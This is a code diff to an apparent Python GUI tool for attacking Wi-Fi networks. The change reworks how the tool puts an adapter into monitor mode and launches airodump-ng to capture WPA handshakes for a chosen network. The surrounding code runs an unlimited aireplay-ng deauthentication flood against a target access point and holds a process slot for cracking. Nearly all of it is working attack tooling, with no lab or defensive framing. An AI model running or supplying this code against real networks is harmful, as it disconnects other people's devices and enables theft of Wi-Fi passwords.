@@ -42,8 +42,6 @@ CAPTURE_DIR="captures/capture_$(date +%Y%m%d_%H%M%S)"
 mkdir -p "$CAPTURE_DIR"
 echo "Captures will be saved in: $CAPTURE_DIR/"
 
-# Unmanage wlan1 in NetworkManager so it won't reclaim the interface,
-# but leave NetworkManager running so wlan0/AP stays up.
 echo "Releasing $WIFI_IFACE from NetworkManager..."
 sudo nmcli device set "$WIFI_IFACE" managed no 2>/dev/null || true
 sudo pkill -9 wpa_supplicant 2>/dev/null || true
@@ -57,16 +55,11 @@ MON_IFACE="${WIFI_IFACE}mon"
 if iw dev "$MON_IFACE" info 2>/dev/null | grep -q "type monitor"; then
     echo "Monitor mode confirmed on $MON_IFACE"
 else
-    echo "ERROR: monitor interface $MON_IFACE not found — adapter may not support RFMON"
+    echo "ERROR: monitor interface $MON_IFACE not found"
     exit 1
 fi
 
-echo "Starting airodump-ng on $MON_IFACE..."
-echo "→ A WPA handshake will be shown in the top right when captured."
-echo "Press the 'Stop Monitoring' button in the GUI to stop."
-
-cd "$CAPTURE_DIR" || exit 1
-exec sudo airodump-ng -w capture --essid "$ESSID" "$MON_IFACE"
+echo "READY: $MON_IFACE $CAPTURE_DIR"
 '''
 
 # ==================== NEW MONITORING WINDOW ====================
@@ -75,6 +68,7 @@ class MonitorWindow:
         self.parent = parent
         self.net = net
         self.wifi_iface = WIFI_IFACE
+        self.mon_iface = f"{WIFI_IFACE}mon"
         self.process = None
         self.deauth_process = None
         self.crack_process = None
@@ -204,29 +198,51 @@ class MonitorWindow:
 
             os.chmod(script_path, 0o755)
 
-            self.process = subprocess.Popen(
+            # Phase 1: run setup script (outputs plain text lines, exits cleanly)
+            setup_proc = subprocess.Popen(
                 ["bash", script_path],
                 stdout=subprocess.PIPE,
                 stderr=subprocess.STDOUT,
                 text=True,
                 bufsize=1,
-                preexec_fn=os.setsid
             )
 
-            self.append_output(f"Started monitoring {self.net['ssid']}\n")
-            self.append_output("Waiting for output...\n\n")
-
             cap_prefix = "Captures will be saved in: "
-            for line in iter(self.process.stdout.readline, ''):
+            for line in iter(setup_proc.stdout.readline, ''):
                 if not self.running:
-                    break
+                    setup_proc.terminate()
+                    return
                 if line.startswith(cap_prefix):
                     rel = line[len(cap_prefix):].strip().rstrip("/")
                     self.capture_dir = os.path.join(self.launch_cwd, rel)
+                elif line.startswith("READY: "):
+                    parts = line[len("READY: "):].strip().split()
+                    self.mon_iface = parts[0]
+                    if len(parts) > 1:
+                        self.capture_dir = os.path.join(self.launch_cwd, parts[1])
                 self.append_output(line)
 
-            if self.process:
-                self.process.wait()
+            setup_proc.wait()
+            if setup_proc.returncode != 0 or not self.capture_dir:
+                self.append_output("\nSetup failed — cannot start capture.\n")
+                return
+
+            if not self.running:
+                return
+
+            # Phase 2: airodump-ng is a curses app — launch it with no stdout capture
+            cap_path = os.path.join(self.capture_dir, "capture")
+            self.process = subprocess.Popen(
+                ["sudo", "airodump-ng", "-w", cap_path, "--essid", self.essid, self.mon_iface],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid,
+            )
+
+            self.append_output(f"\nairodump-ng running on {self.mon_iface}.\n")
+            self.append_output("Waiting for WPA handshake...\n")
+
+            self.process.wait()
 
         except Exception as e:
             self.append_output(f"\nError: {e}\n")
@@ -245,7 +261,7 @@ class MonitorWindow:
             if self.deauth_process and self.deauth_process.poll() is None:
                 self.deauth_process.terminate()
 
-            cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, f"{self.wifi_iface}mon"]
+            cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, self.mon_iface]
             self.deauth_process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
@@ -368,7 +384,7 @@ class MonitorWindow:
                 pass
 
         try:
-            mon_iface = f"{self.wifi_iface}mon"
+            mon_iface = self.mon_iface
 
             print(f"Stopping monitor mode on {mon_iface}...")
 
